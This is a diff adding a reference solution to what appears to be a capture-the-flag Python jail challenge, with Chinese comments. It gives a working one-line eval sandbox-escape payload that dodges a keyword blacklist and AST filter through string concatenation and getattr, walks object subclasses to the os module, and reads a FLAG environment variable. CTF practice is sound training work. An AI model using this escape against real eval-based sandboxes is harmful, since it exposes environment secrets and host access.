@@ -1,0 +1,7 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+# 钥匙：globals() 取回 ns 里的 __builtins__ dict（源码用拼接绕黑名单），
+# 从中拿唯一被允许的 getattr；随后全程 G() 调用代替属性访问（绕 AST），
+# 被禁词全部拆开拼接。_wrap_close 来自 socket 引入的 os 模块，
+# 其 __init__.__globals__ 里有 sys，sys.modules 里挖出 os。
+(G := globals()['__bu'+'iltins__']['getattr']) and G(G(G([x for x in G(G(G((), '__cl'+'ass__'), '__ba'+'se__'), '__sub'+'classes__')() if G(x, '__name__')=='_wrap_'+'clo'+'se'][0], '__in'+'it__'), '__gl'+'obals__')['s'+'ys'].modules['o'+'s'], 'envi'+'ron')['F'+'LAG']
